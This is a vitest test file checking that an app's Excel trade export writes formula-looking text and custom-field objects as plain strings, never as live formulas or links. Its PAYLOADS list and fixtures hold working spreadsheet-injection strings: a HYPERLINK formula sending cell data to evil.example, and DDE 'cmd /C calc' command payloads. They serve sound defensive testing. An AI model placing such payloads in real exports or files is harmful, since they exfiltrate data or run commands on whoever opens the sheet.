import { describe, expect, it } from "vitest";
import ExcelJS from "exceljs";
import { rowsToXlsxBuffer, tradeToRow } from "./export";
import type { FieldDefinition } from "@/lib/fields/types";
import type { Trade } from "./types";

// Security gaps pass, 5.4: nothing in an Excel export is a live formula or
// link, whatever text or JSON a trade holds. The CSV side is in
// export.security.test.ts.

const PAYLOADS = ['=HYPERLINK("https://evil.example/?d="&A1,"click")', "+cmd|' /C calc'!A0", "@SUM(1+1)*cmd|' /C calc'!A0", "-2+3"];

function field(key: string, label: string): FieldDefinition {
  return { key, label, field_type: "text", entity_type: "trade" } as unknown as FieldDefinition;
}

async function readBack(buffer: Buffer) {
  const wb = new ExcelJS.Workbook();
  await wb.xlsx.load(buffer as unknown as ArrayBuffer);
  const cells: ExcelJS.Cell[] = [];
  wb.getWorksheet("Trades")!.eachRow((row) => row.eachCell((cell) => cells.push(cell)));
  return cells;
}

describe("rowsToXlsxBuffer formula injection", () => {
  it("writes formula-looking text as plain string cells", async () => {
    const cells = await readBack(await rowsToXlsxBuffer(PAYLOADS.map((p) => ({ ticker: "AAPL", note: p }))));
    const notes = cells.filter((c) => typeof c.value === "string" && PAYLOADS.includes(c.value));
    expect(notes).toHaveLength(PAYLOADS.length);
    for (const cell of cells) {
      expect(cell.type).not.toBe(ExcelJS.ValueType.Formula);
      expect(cell.type).not.toBe(ExcelJS.ValueType.Hyperlink);
    }
  });

  it("writes a custom-field object as its JSON text, never as a formula or link", async () => {
    const trade = {
      ticker: "AAPL",
      custom_fields: {
        f1: { formula: 'HYPERLINK("https://evil.example","x")', result: 1 },
        f2: { text: "x", hyperlink: "https://evil.example" },
        f3: [{ formula: "1+1" }, "plain"],
        f4: Number.POSITIVE_INFINITY,
      },
    } as unknown as Trade;
    const row = tradeToRow(trade, [field("f1", "One"), field("f2", "Two"), field("f3", "Three"), field("f4", "Four")]);
    expect(row.One).toBe(JSON.stringify(trade.custom_fields.f1));
    expect(row.Three).toBe('{"formula":"1+1"}; plain');
    expect(row.Four).toBeNull();

    const cells = await readBack(await rowsToXlsxBuffer([row]));
    for (const cell of cells) {
      expect(cell.type).not.toBe(ExcelJS.ValueType.Formula);
      expect(cell.type).not.toBe(ExcelJS.ValueType.Hyperlink);
    }
    expect(cells.some((c) => c.value === JSON.stringify(trade.custom_fields.f1))).toBe(true);
  });
});
